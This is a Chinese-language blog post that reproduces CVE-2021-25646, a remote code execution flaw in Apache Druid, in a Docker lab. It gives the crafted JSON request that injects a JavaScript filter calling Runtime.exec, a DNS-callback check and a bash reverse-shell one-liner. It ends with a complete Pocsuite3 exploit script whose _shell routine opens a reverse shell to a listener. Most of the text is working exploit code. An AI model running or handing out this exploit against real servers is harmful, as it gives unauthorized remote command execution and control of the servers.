## 一、CVE-2021-25646复现
### 0x00:Druid简介
 Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid 最常用的场景就是大数据背景下、灵活快速的多维 OLAP 分析。

### 0x01:漏洞简述
![在这里插入图片描述](https://img-blog.csdnimg.cn/ee00016b792746428bb5bdfcb4281dda.png)
具体的漏洞分析可参考
[https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw](https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw)
这里就了解一下漏洞的关键，补充一下基础知识

> @JasonCreator

该注解用在对象的反序列时指定特定的构造函数或者工厂方法。在反序列化时，Jackson默认会调用对象的无参构造函数，如果我们不定义任何构造函数，Jvm会负责生成默认的无参构造函数。但是如果我们定义了构造函数，并且没有提供无参构造函数时，Jackson会报错

再回到@JsonCreator注解，其作用就是，指定对象反序列化时的构造函数或者工厂方法，如果默认构造函数无法满足需求，或者说我们需要在构造对象时做一些特殊逻辑，可以使用该注解。该注解需要搭配@JsonProperty使用

> @JsonProperty

此注解作用于属性上，作用是把该属性的名称序列化成另一个自己想要的名称

对属性名进行重命名，在java里我们墨守规定驼峰命名，但是在一些特殊的场合下，比如数据库是下划线等，再此我们就可以进行映射

对属性名称重命名，比如在很多场景下Java对象的属性是按照规范的驼峰书写，但在数据库设计时使用的是下划线连接方式，此处在进行映射的时候 

**具体可参考**
[https://mp.weixin.qq.com/s/m7WLwJX-566WQ29Tuv7dtg](https://mp.weixin.qq.com/s/m7WLwJX-566WQ29Tuv7dtg)
### 0x01:影响版本
```php
Apache Druid < 0.20.1
```
### 0x02:复现过程
先将环境搭建起来
```bash
docker pull fokkodriesprong/docker-druid
docker run --rm -i -p 8000:8888 fokkodriesprong/docker-druid
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/44f5a45ebb404be5b505ad1425824b33.png)
**Base directory:**
```c
quickstart/tutorial/
```
**File filter:**
```c
wikiticker-2015-09-12-sampled.json.gz
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6ceb9b4e8f1c4ae786cb209b5def625e.png)F
接下来一直Next
![在这里插入图片描述](https://img-blog.csdnimg.cn/7c59326155bf45bfa1003043c07f271e.png)
直到将要跳转到Filter时，burp抓包
![在这里插入图片描述](https://img-blog.csdnimg.cn/c1c4ab30d9a14ffa8a980755ab1edab8.png)
修改`transformSpec`参数，加上`filter`字段

```py
"filter":{
    "type":"javascript",
    "function":"function(value){return java.lang.Runtime.getRuntime().exec('curl localhost:9999')}",
    "dimension":"added",
    "":{
    "enabled":"true"
    }
}
```
拼接后的`data`数据为
```bash
{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/opt/","filter":""}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",
"function":"function(value){return java.lang.Runtime.getRuntime().exec('ping 9ktg6o.dnslog.cn')}",
"dimension":"added",
"":{
"enabled":"true"
}
}}}},"samplerConfig":{"numRows":500,"cacheKey":"c67e2881f1c64110b40c0f67608b0022"}}
```
查看DNSlog
![在这里插入图片描述](https://img-blog.csdnimg.cn/fe4c5588be2e4d61b4a8e1696a4f2f94.png)
将exec中的命令也可以替换成反弹shell

```bash
/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx/xxx 0>&1
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/304297fe7dde47f982a7ed64deda8cc9.png)
## 二、利用Pocsuite框架写POC&EXP
对漏洞复现完之后，对整体流程便有了一定的了解，接下来借助pocsuite编写一下poc和exp

> (脚本写的垃圾，大佬勿喷)

```py
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.lib.utils import random_str
import json

class POC(POCBase):
    vulID = 'attackbot-30'  # 自有编号
    vulnerability = 'CVE-2021-25646'  # 填写CVE或者CNVD编号没有null
    author = 'attackbot'  # 默认为attackbot不用修改
    vulDate = '2021-1-7'  # 漏洞公开的时间,不知道就写今天
    grade = 'high'  # 等级选项high,medium,low
    appPower = 'apache'  # 漏洞厂商名字
    appName = 'Druid'  # 漏洞应用名称
    appVersion = 'Apache Druid < 0.20.1'  # 漏洞影响版本
    name = 'attackbot_30_Apache_RCE_poc.py'  # 命名编号
    vulType = 'RCE'  # 漏洞类型,类型参考见 漏洞类型规范表
    vulclassification = 'Web'  # 漏洞归类 Web,Middleware,System,Internet equipment,safety equipment
    createDate = '2021-1-7'  # 编写 PoC 的日期
    updateDate = '2021-1-7'  # PoC 更新的时间,默认和编写时间一样
    desc = '''
    在Druid 0.20.0及更低版本中，用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。
    '''
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''  '''

    def _verify(self):
        result = {}
        vul = self.url
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "application/json",
        }
        data = {
                "type":"index",
                "spec":{
                    "type":"index",
                    "ioConfig":{
                        "type":"index",
                        "firehose":{
                            "type":"local",
                            "baseDir":"/opt/",
                            "filter":""
                        }
                    },
                    "dataSchema":{
                        "dataSource":"sample",
                        "parser":{
                            "type":"string",
                            "parseSpec":{
                                "format":"json",
                                "timestampSpec":{
                                    "column":"time",
                                    "format":"iso"
                                },
                                "dimensionsSpec":{

                                }
                            }
                        },
                        "transformSpec":{
                            "transforms":[

                            ],
                            "filter":{
                                "type":"javascript",
                                "function":"function(value){return java.lang.Runtime.getRuntime().exec('ping xxxxx.ceye.io')}",
                                "dimension":"added",
                                "":{
                                    "enabled":"true"
                                }
                            }
                        }
                    }
                },
                "samplerConfig":{
                    "numRows":500,
                    "cacheKey":"c67e2881f1c64110b40c0f67608b0022"
                }
            }
        try:
            rep1 = requests.post(url=self.url.rstrip("/")+"/druid/indexer/v1/sampler?for=filter",headers=headers,data=json.dumps(data))
            if rep1.status_code == 200:
                url = 'http://api.ceye.io/v1/records'
                params = {
                    "token": "xxxx",
                    "type": "dns",
                    "filter": "xxx.ceye.io"
                }
                rep2 = requests.get(url=url, params=params,timeout=2)
                if "xxxx.ceye.io" in rep2.text:
                    result['VerfiryInfo'] = {}
                    result['VerfiryInfo']['URL'] = self.url
        except Exception as e:
            print(e)
        return self.parse_output(result)
    def getshell(self,cmd):
        result = {}
        vul = self.url.rstrip("/")+"/druid/indexer/v1/sampler?for=filter"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "application/json",
        }
        data = {
        "type": "index",
        "spec": {
            "type": "index",
            "ioConfig": {
                "type": "index",
                "firehose": {
                    "type": "local",
                    "baseDir": "/opt/",
                    "filter": ""
                }
            },
            "dataSchema": {
                "dataSource": "sample",
                "parser": {
                    "type": "string",
                    "parseSpec": {
                        "format": "json",
                        "timestampSpec": {
                            "column": "time",
                            "format": "iso"
                        },
                        "dimensionsSpec": {}
                    }
                },
                "transformSpec": {
                    "transforms": [],
                    "filter": {
                        "type": "javascript",
                        "function": "function(value){return java.lang.Runtime.getRuntime().exec('"+cmd+"')}",
                        "dimension": "added",
                        "": {
                            "enabled": "true"
                        }
                    }
                }
            }
        },
        "samplerConfig": {
            "numRows": 500,
            "cacheKey": "c67e2881f1c64110b40c0f67608b0022"
        }
    }
        rep = requests.post(url=vul, headers=headers, data=json.dumps(data))
    def _shell(self):
        cmd = "/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/{0}/{1} 0>&1".format(get_listener_ip(), get_listener_port())
        # print(cmd)
        result = dict()
        self.getshell(cmd)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(POC)
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d33ff4fde34e486facfb1fe44e4548b2.png)
这里注意Pocsuite3的语法，需要先`list`列出来，然后`select`进行选择


### 参考链接
[https://cloud.tencent.com/developer/article/1851527](https://cloud.tencent.com/developer/article/1851527)
